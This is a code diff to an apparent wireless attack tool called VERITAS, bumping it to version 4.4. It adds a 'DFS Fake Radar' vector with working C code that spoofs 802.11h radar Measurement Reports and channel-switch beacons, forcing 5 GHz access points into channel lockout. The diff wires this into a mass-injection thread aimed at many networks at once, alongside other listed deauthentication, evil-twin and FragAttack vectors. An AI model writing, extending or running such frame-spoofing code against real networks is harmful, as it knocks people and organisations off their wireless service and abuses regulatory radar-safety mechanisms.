@@ -117,7 +117,7 @@ static const char *BANNER =
     "\n" C_DEEP_B BLD
     "   ╠══════════════════════════════════════════════════════════════╣" RST
     "\n" C_ICE BLD
-    "   ║      V E R I T A S   v 4 . 1  —  Audit-Fixed Edition       ║" RST
+    "   ║      V E R I T A S   v 4 . 4  —  Audit-Fixed Edition       ║" RST
     "\n" C_DEEP_B BLD
     "   ╚══════════════════════════════════════════════════════════════╝" RST
     "\n";
@@ -126,7 +126,7 @@ static const char *BANNER =
  *               CONSTANTS
  * ============================================================ */
 
-#define VERSION "4.3.1"
+#define VERSION "4.4.0"
 #define MAX_SSID_LEN 32
 #define MAX_MAC_STR 18
 #define MAX_IFACE 32
@@ -163,6 +163,7 @@ typedef enum {
   VEC_TKIP_MIC,
   VEC_POWER_SAVE,
   VEC_FRAGATTACK,
+  VEC_DFS_FAKE_RADAR,
   VEC_COUNT
 } attack_vector_t;
 
@@ -172,6 +173,7 @@ static const char *VEC_NAMES[] = {
     "Auth Table DoS",      "CSA Action Frame",  "Beacon Confusion",
     "Probe Response CSA",  "DELBA Attack",      "Evil Twin Handoff",
     "TKIP/GCMP MIC Error", "Power Save DoS",    "FragAttack Injection",
+    "Operating Channel Aggression",
 };
 
 typedef enum {
@@ -930,6 +932,118 @@ static int mk_frag_payload(uint8_t *b, const uint8_t bss[6],
 }
 
 /* ============================================================
+ *  Operating Channel Aggression — DFS Fake Radar (Vector #16)
+ *
+ *  Spoofs IEEE 802.11h Spectrum Management signalling that
+ *  mimics a military/weather radar detection event on a DFS
+ *  operating channel (UNII-2 / UNII-2e: ch 52–64, 100–144).
+ *
+ *  Packet pair:
+ *    1. Measurement Report Action (Basic Report, Map bit3=Radar)
+ *       Client→AP: claims radar energy was observed on cur_ch
+ *    2. CSA Beacon (mode=1 stop-TX, count=0) AP→broadcast
+ *       Spoofs the AP's mandatory channel vacation response
+ *
+ *  Tactical effect: compliant 5 GHz APs must vacate the channel
+ *  and enter Non-Occupancy / CAC lockout (minutes) per aviation
+ *  DFS regulations (ETSI EN 301 893 / FCC Part 15 Subpart E).
+ *
+ *  Reference: IEEE 802.11-2020 §11.9 (DFS), §9.4.2.22 (Meas Report)
+ * ============================================================ */
+
+/* Prefer a non-DFS redirect so vacate CSA lands on a usable channel */
+static uint8_t pick_safe_ch(uint8_t cur, uint8_t preferred) {
+  if (valid_ch(preferred) && !is_dfs_ch(preferred))
+    return preferred;
+  if (cur >= 36)
+    return 36; /* UNII-1 */
+  return 1;
+}
+
+/*
+ * mk_dfs_radar_report — Spectrum Management Measurement Report
+ *
+ * Action Category 0 / Action 1 with Measurement Report IE (ID=39)
+ * Basic Report Map bit 3 set → Radar Detected.
+ * Addressed Client→AP so the AP processes the radar claim.
+ */
+static int mk_dfs_radar_report(uint8_t *b, const uint8_t bss[6],
+                               const uint8_t cli[6], uint8_t cur_ch) {
+  int o = 0;
+  o += mk_rt(b + o);
+  /* Client → AP (addr1=BSSID, addr2=Client, addr3=BSSID) */
+  o += mk_dot11(b + o, FC_ACTION, bss, cli, bss, 0);
+
+  b[o++] = 0; /* Category: Spectrum Management */
+  b[o++] = 1; /* Action: Measurement Report */
+  b[o++] = 1; /* Dialog Token */
+
+  /* Measurement Report IE (ID=39, len=15) — Basic Report + Radar map */
+  b[o++] = 39; /* Element ID: Measurement Report */
+  b[o++] = 15; /* Length */
+  b[o++] = 1;  /* Measurement Token */
+  b[o++] = 0;  /* Report Mode: success (not late/incapable/refused) */
+  b[o++] = 0;  /* Measurement Type: Basic Report */
+  b[o++] = cur_ch; /* Channel Number under test */
+
+  /* Measurement Start Time (8 bytes TSF) */
+  uint64_t tsf = htole64(mono_us());
+  memcpy(b + o, &tsf, 8);
+  o += 8;
+
+  /* Measurement Duration (TU) */
+  uint16_t dur = htole16(50);
+  memcpy(b + o, &dur, 2);
+  o += 2;
+
+  /* Basic Report Map: bit3 = Radar (0x08) */
+  b[o++] = 0x08;
+
+  return o;
+}
+
+/*
+ * mk_dfs_vacate_csa — Spoofed AP Channel Switch after "radar"
+ *
+ * Beacon from BSSID with CSA IE mode=1 (stop TX until switch),
+ * count=0 (immediate). Forces clients off-channel and simulates
+ * the AP's regulatory DFS vacation announcement.
+ */
+static int mk_dfs_vacate_csa(uint8_t *b, const uint8_t bss[6], const char *ssid,
+                             uint8_t cur_ch, uint8_t safe_ch) {
+  int o = 0;
+  o += mk_rt(b + o);
+  o += mk_dot11(b + o, FC_BEACON, BCAST, bss, bss, 0);
+
+  beacon_fix_t *f = (beacon_fix_t *)(b + o);
+  f->ts = htole64(mono_us());
+  f->interval = htole16(100);
+  f->cap = htole16(0x0031); /* ESS + Spectrum Management capable */
+  o += sizeof(beacon_fix_t);
+
+  int sl = (int)strlen(ssid);
+  if (sl > MAX_SSID_LEN)
+    sl = MAX_SSID_LEN;
+  b[o++] = 0;
+  b[o++] = (uint8_t)sl;
+  memcpy(b + o, ssid, sl);
+  o += sl;
+
+  o += mk_ds_ie(b + o, cur_ch);
+
+  /* CSA IE — immediate TX stop + channel vacation */
+  b[o++] = 37;
+  b[o++] = 3;
+  csa_ie_t *c = (csa_ie_t *)(b + o);
+  c->mode = 1; /* stop transmission until channel switch */
+  c->ch = safe_ch;
+  c->count = 0; /* switch immediately */
+  o += sizeof(csa_ie_t);
+
+  return o;
+}
+
+/* ============================================================
  *               PACKET FACTORY
  * ============================================================ */
 
@@ -953,6 +1067,9 @@ typedef struct {
   /* FragAttack: two-fragment pair for plaintext injection */
   pkt_t frag_setup;   /* Fragment 0: LLC/SNAP + partial ARP (MoreFrag=1) */
   pkt_t frag_payload; /* Fragment 1: injected payload tail (MoreFrag=0) */
+  /* DFS Fake Radar: Measurement Report + vacate CSA pair */
+  pkt_t dfs_radar_report; /* Spectrum Mgmt Measurement Report (Radar bit) */
+  pkt_t dfs_vacate_csa;   /* Spoofed AP CSA beacon forcing channel vacation */
 } factory_t;
 
 /* [FIX 10] factory_build checks parse_mac returns */
@@ -1010,6 +1127,13 @@ static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
   f->frag_setup.len = mk_frag_setup(f->frag_setup.buf, bss, cli, frag_seq);
   f->frag_payload.len =
       mk_frag_payload(f->frag_payload.buf, bss, cli, frag_seq, NULL, 0);
+
+  /* DFS Fake Radar: Measurement Report (radar) + vacate CSA pair */
+  uint8_t safe = pick_safe_ch(cur_ch, (uint8_t)new_ch);
+  f->dfs_radar_report.len =
+      mk_dfs_radar_report(f->dfs_radar_report.buf, bss, cli, cur_ch);
+  f->dfs_vacate_csa.len =
+      mk_dfs_vacate_csa(f->dfs_vacate_csa.buf, bss, t->ssid, cur_ch, safe);
 
   for (int i = 0; i < MAX_AUTH_POOL; i++) {
     uint8_t fm[6];
@@ -1069,6 +1193,11 @@ static pkt_set_t factory_get(factory_t *f, attack_vector_t v) {
     /* Fragment pair must be injected in order: setup → payload */
     s.p[s.n++] = &f->frag_setup;
     s.p[s.n++] = &f->frag_payload;
+    break;
+  case VEC_DFS_FAKE_RADAR:
+    /* Radar claim first, then spoofed AP vacation CSA */
+    s.p[s.n++] = &f->dfs_radar_report;
+    s.p[s.n++] = &f->dfs_vacate_csa;
     break;
   /* [FIX 3] Non-injection vectors: handled by other engines */
   case VEC_PMKID_CAPTURE:
@@ -1714,7 +1843,7 @@ static void *display_thread(void *arg) {
     printf("  " C_DEEP_B "╔══════════════════════════════════════════════╗" RST
            "\n");
     printf("  ║" C_ICE BLD
-           "     VERITAS v4.1 — ACTIVE SESSION          " RST C_DEEP_B "║" RST
+           "     VERITAS v4.4 — ACTIVE SESSION          " RST C_DEEP_B "║" RST
            "\n");
     printf("  " C_DEEP_B "╠══════════════════════════════════════════════╣" RST
            "\n");
@@ -2555,6 +2684,18 @@ static void run_script(const char *path) {
     printf("  " C_YELLOW
            "[DFS] Redirect to DFS ch %d — extended DoS via CAC delay" RST "\n",
            cfg.new_ch);
+  if (cfg.vec_on[VEC_DFS_FAKE_RADAR]) {
+    if (is_dfs_ch(tgt.channel))
+      printf("  " C_YELLOW
+             "[OCA] Target ch %d is DFS — Fake Radar can force CAC/"
+             "Non-Occupancy lockout" RST "\n",
+             tgt.channel);
+    else
+      printf("  " C_YELLOW
+             "[OCA] Target ch %d is non-DFS — Fake Radar still injects "
+             "Measurement Report + vacate CSA" RST "\n",
+             tgt.channel);
+  }
 
   set_ch(cfg.iface, tgt.channel);
   usleep_precise(0.3);
@@ -3145,6 +3286,30 @@ static void *stress_injector_thread(void *arg) {
         }
       }
 
+      if (a->cfg->vec_on[VEC_DFS_FAKE_RADAR]) {
+        uint8_t fake_cli[6];
+        rand_mac(fake_cli);
+        uint8_t cur = (uint8_t)snap[i].channel;
+        uint8_t safe = pick_safe_ch(cur, 36);
+        const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
+
+        len = mk_dfs_radar_report(tmp, bss, fake_cli, cur);
+        if (inject_one(sock, tmp, len) > 0) {
+          atomic_fetch_add(&g_pkts_sent, 1);
+          sent_for_ap++;
+        } else {
+          atomic_fetch_add(&g_pkts_fail, 1);
+        }
+
+        len = mk_dfs_vacate_csa(tmp, bss, ssid, cur, safe);
+        if (inject_one(sock, tmp, len) > 0) {
+          atomic_fetch_add(&g_pkts_sent, 1);
+          sent_for_ap++;
+        } else {
+          atomic_fetch_add(&g_pkts_fail, 1);
+        }
+      }
+
       /* Update per-AP counter */
       pthread_mutex_lock(&a->pool->lock);
       for (int j = 0; j < a->pool->count; j++) {
@@ -3204,7 +3369,7 @@ static void *stress_display_thread(void *arg) {
            "\n");
     printf(
         "  ║" C_RED BLD
-        "   VERITAS v4.3 — STRESS TEST (MASS INJECTION)           " RST C_DEEP_B
+        "   VERITAS v4.4 — STRESS TEST (MASS INJECTION)           " RST C_DEEP_B
         "║" RST "\n");
     printf("  " C_DEEP_B
            "╠══════════════════════════════════════════════════════════╣" RST
@@ -3717,6 +3882,16 @@ int main(int argc, char **argv) {
     printf("  " C_CYAN "[DUAL]" RST " %s\n", cfg.iface2);
   if (cfg.spawn_rogue)
     printf("  " C_ORANGE "[ROGUE]" RST " AP enabled\n");
+  if (cfg.vec_on[VEC_DFS_FAKE_RADAR]) {
+    if (is_dfs_ch(tgt.channel))
+      printf("  " C_YELLOW "[OCA]" RST
+             " DFS Fake Radar on ch %d — CAC/Non-Occupancy lockout\n",
+             tgt.channel);
+    else
+      printf("  " C_YELLOW "[OCA]" RST
+             " DFS Fake Radar active (target ch %d non-DFS)\n",
+             tgt.channel);
+  }
   printf("  " C_DEEP_B "══════════════════════════════════════" RST "\n");
 
   printf("\n  " C_RED BLD "Deploy?" RST " (y/N): ");
